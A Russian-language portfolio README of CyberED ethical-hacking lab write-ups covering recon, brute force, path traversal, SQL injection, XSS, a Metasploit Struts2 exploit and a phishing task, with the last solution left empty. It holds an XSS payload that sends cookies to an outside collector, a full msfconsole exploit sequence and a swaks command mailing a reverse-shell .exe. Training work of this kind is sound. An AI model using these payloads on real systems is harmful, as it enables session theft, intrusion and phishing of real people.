# Профессия "Белый хакер" от CyberED

За время обучения были получены навыки работы с msfconsole, msfvenom, meterpeter, swaks, Burp, nmap.
Выполено множество заданий на повышение привилегий, проброс траффика и брутфорс.
По итогу был получен сертификат с отличием за успешно пройденый курс с выполнением всех заданий.

Ниже под сертификатом предствлены выполненые задания.

![Сертификат CyberED](https://github.com/TreninYI/InfoSec/assets/121427985/59c10db6-bdb0-4b8a-a188-85cc27c45e18)


## Практика «Разведка во внешней сети»
Задание:
Проанализируйте существующие поддомены основного домена компании cyber-ed.ru. Выявите домен, который похож на название домена для задания, и изучите его DNS TXT записи.
Решение:
Для начала на сайте [CRT](https://crt.sh/) смотрим поддомены [CyberED](https://cyber-ed.ru/)

![Screenshot1](https://github.com/TreninYI/InfoSec/assets/121427985/784ac128-8043-448e-8e31-c13dc1d520a5)

Я сразу увидел подсказку, требуется проерить поддомент task.cyber-ed.ru.
С помощью Kali в терминале написал nslookup -q=TXT task.cyber-ed.ru и получил заветный флаг

![Screenshot2](https://github.com/TreninYI/InfoSec/assets/121427985/0652c140-cafd-48c7-9db0-43896585f759)


##  Уязвимости обхода аутентификации
Задание: 
Проанализируйте защищенность механизмов аутентификации административной панели и проэксплуатируйте найденные уязвимости.

Решение:
С помощью ffuf выяснил, что имеется поле входа:

![3](https://github.com/TreninYI/InfoSec/assets/121427985/8d67724f-30ce-419f-bac7-35c6d954bd57)

Затем в барузере открыл это поле и с помощтю Burp провел перебор пароля загрузив логин admin и список уязвимых паролей из сети:

![4](https://github.com/TreninYI/InfoSec/assets/121427985/03bae266-3dc0-4679-9062-09922acdf149)

![5](https://github.com/TreninYI/InfoSec/assets/121427985/78c192ef-a351-441a-bdee-ad76179a4304)

![6](https://github.com/TreninYI/InfoSec/assets/121427985/1d15078c-89aa-4209-8f4d-404981bd7a28)

![7](https://github.com/TreninYI/InfoSec/assets/121427985/6c0a60cf-c114-48c4-8e12-e6da3a2624f9)

![8](https://github.com/TreninYI/InfoSec/assets/121427985/c38db723-17b4-43c4-aeca-0964d7c61f88)

Далее проверил, что войти под учетной записью админ получилось, но так же стлкнулся с трехзначным кодом. По той же схеме подобрал трехзначный код и попал на сервер, где лежал флаг.

![Screenshot3](https://github.com/TreninYI/InfoSec/assets/121427985/0e3c8711-e008-4352-9c82-33a785f1b5a4)


## Практика «Уязвимости инъекции команд ОС»
Здание: 
Проанализируйте защищенность механизма работы с процессами ОС на главной странице панели администратора. Обнаружьте и проэксплуатируйте на этой странице уязвимости инъекции команд терминальной оболочки.
В качестве подтверждения успешной эксплуатации предоставьте флаг (секретную строку в формате 32 букв и цифр) из переменных окружения операционной системы.
Решение:
Самый простой способ получить флаг, это перейти по ссылке http://localhost:1337/receipt.php?orderID=1
Затем на открывшейся странице прокрутить вниз и увидеть поле Comments в котором содержится флаг.

![Screenshot4](https://github.com/TreninYI/InfoSec/assets/121427985/7d94d843-cb22-4481-8e21-94ce451d960a)

## Практика «Уязвимости контроля доступа»
Задание:
Проанализируйте защищенность механизма проверки информации о заказе в магазине курсов. Обнаружьте уязвимости контроля доступа, позволяющие исследовать содержимое заказов других пользователей.
В качестве подтверждения успешной эксплуатации уязвимости предоставьте флаг (секретную строку в формате 32 букв и цифр) из 1-го заказа в интернет магазине.
Решение:
- Я загрузите главную страницу http://evil.corp:1337 и проанализировал запросы в BurpSuite.
- Увидел, что за отображение изображений отвечает скрипт image.php, а имя изображения передается через параметр файла.
- Отправил запрос в Ретранслятор.
- В этом режиме можно редактировать запрос, повторно отправлять его на сервер и получать результат. Я изменил значение параметра файла на неверное просто удалив последний символ из названия изображения.
- Из сообщения об ошибке получил информацию о реальном пути к образу на стороне сервера и местоположении скрипта. Попробуем использовать абсолютный путь к файлу, который обязательно должен находиться в удаленной системе Linux, например /etc/hosts.
- Таким образом, с каждым ../ поднимаюсь на уровень выше /var/www/html/static/ и путь /var/www/html/static/../../../../ становится эквивалентным пути в корневой каталог /, что позволяет получить доступ к любым файлам в системе, например /etc/passwd.
- Далее виден флаг.

![Screenshot5](https://github.com/TreninYI/InfoSec/assets/121427985/5ce26f4c-85eb-49b2-97e6-3442746ca228)

## Практика «Уязвимости SQL-инъекций»
Задание: 
Проанализируйте защищенность механизма проверки информации о заказе в интернет магазине. Обнаружьте уязвимости инъекции SQL конструкций и проэксплуатируйте ее. 
В качестве подтверждения успешной эксплуатации уязвимости предоставьте флаг (секретную строку в формате 32 букв и цифр) из секретного столбца секретной таблицы, имена которых вам заранее не известны.
Решение:
Для выполнения данного задания треуется иметь базовые знания таблиц SQL.
Собственно пришлось перебирать варианты строк и столбцов, затем в строку поиска браузера вбивать данные, чтобы выявить секретный флаг в окне Comments.

![Screenshot6](https://github.com/TreninYI/InfoSec/assets/121427985/3786ddc9-6d44-48ae-8ad3-c861585daa55)

## Практика «Атаки межсайтового скриптинга (XSS)»
Задание:
Нужно перейти на главную страницу сайта http://evil.corp:1337/.
С помощью BurpSuite найти запрос, отправьте его в репитер и вставьте предложение в поле телефона.
Нужно ввести знак «>», чтобы разорвать HTML-тег и вставить свой собственный.
Далее можно использовать полезную нагрузку для отправки сообщения 1 каждому, кто откроет страницу заказа:

- +79117238383”><img src=x onerror=alert(1) />

Делее я закодировал эту полезную нагрузку с помощью декодера.

![Screenshot7](https://github.com/TreninYI/InfoSec/assets/121427985/f9f264a1-60cc-491b-a61b-97a652640636)

И вставил в поле телефон:

![Screenshot8](https://github.com/TreninYI/InfoSec/assets/121427985/fbe40689-d514-45ae-96ef-cee75723d977)

При входе на страницу получил следующее сообщение:

![image](https://github.com/TreninYI/InfoSec/assets/121427985/012b3b65-84e8-45d3-a888-c63b565c67d4)

Одним из наиболее распространенных сценариев атаки в этой ситуации является передача злоумышленнику файла cookie посетителя. Для принятия запроса мы будем использовать ресурс https://requestbin.com/ . Используйте URL-адрес, указанный в поле Конечная точка, для получения файла cookie:
+79117238383”><img src=x onerror=fetch(‘https://ADDR.x.pipedream.net/?’+document.cookie) />
где ADDR — адрес вашей конечной точки.

Нужно перекодировать полезную нагрузку и отправить ее в запросе, а затем открыть новый ордер, после чего в интерфейсе Pipedream появится запрос с флагом.

![Screenshot9](https://github.com/TreninYI/InfoSec/assets/121427985/5a15a5f5-fcbf-4b46-b139-49c520857f65)

## Практика «Эксплуатация уязвимостей 1-го дня сетевых сервисов»
Задание:
Проанализируйте веб-приложение, развернутое по адресу http://localhost:1337. Обнаружьте версию ПО и его наименование, постарайтесь определить наличие в данном ПО известных уязвимостей при помощи фреймворка Metasploit. Проэксплуатируйте известную уязвимость имеющуюся в используемом приложении фреймворке.
В качестве подтверждения успешной эксплуатации предоставьте флаг (секретную строку в формате 32 букв и цифр) из файла root.txt, расположенного в директории /root/.
Решение:
Работа в msfconsole:
```bash
msfconsole <- Launch framework
```
```bash
search struts showcase <- Search for all possible exploits containing the string “struts showcase”
```
```bash
use exploit/multi/http/struts2_code_exec_showcase <- Select an exploit to work with later setup
```
```bash
info <- Examining information about the exploit
```
```bash
options <- Demonstration of options for configuring the exploit
```
```bash
set RHOSTS localhost <- Set up the host to use the exploit
```
```bash
set RPORT 1337 <- Set the port to apply the exploit to
```
```bash
set TARGETURI /integration/saveGangster.action <- Setting the location of the vulnerable plugin on the site
```
```bash
set PAYLOAD cmd/unix/generic <- Setting the “load” executable after the exploit is applied
```
```bash
set CMD 'cat /root/root.txt' <- Set load options (Indicate the command to be executed)
```
```bash
check <- Using a “checker” to check the correctness of the configured exploit
```
```bash
exploit <- Exploitation of a vulnerability
```

![Screenshot1](https://github.com/TreninYI/InfoSec/assets/121427985/6ad3343d-2ef6-4561-bc9d-28c4f8cdbb7b)

## Практика «Атаки с применением методов социальной инженерии»
Задание:
Ваша задача - подготовить исполняемый файл (расширения .exe) при помощи msfvenome и отправить его пользователю mike@sandbox.local рабочей станции, для того чтобы захватить управление его машиной при помощи MetaSploit.
Для того чтобы отправить письмо на развернутый вами лабораторный стенд, можно воспользоваться различными почтовыми агентами, например: swaks (Для установки в Kali Linux: apt install swaks).
Так как лабораторный стенд, который вы будете атаковать,  является почтовым сервером, надо отправлять письмо с его помощью, то есть адресом почтового сервера должен быть IP адрес лабораторного стенда, который вы развернули.
Пример команды для отправки письма:
swaks --to mike@sandbox.local --from administrator@sandbox.local --header "Subject: Updates" --body "Please run this exe file for updates" --server 192.168.1.102 --attach example.exe
, где 192.168.1.102 - IP адрес, развернутого вами лабораторного стенда, example.exe - нагрузка, подготовленная вами для получения реверс-шелла.
В качестве ответа предоставьте флаг из файла root.txt с рабочего стола пользователя Mike.
После запуска машины, чтобы она инициализировала сеть, необходимо войти в нее под специальным аккаунтом: 
Логин: Trevis
Пароль: Qwerty123
Решение:


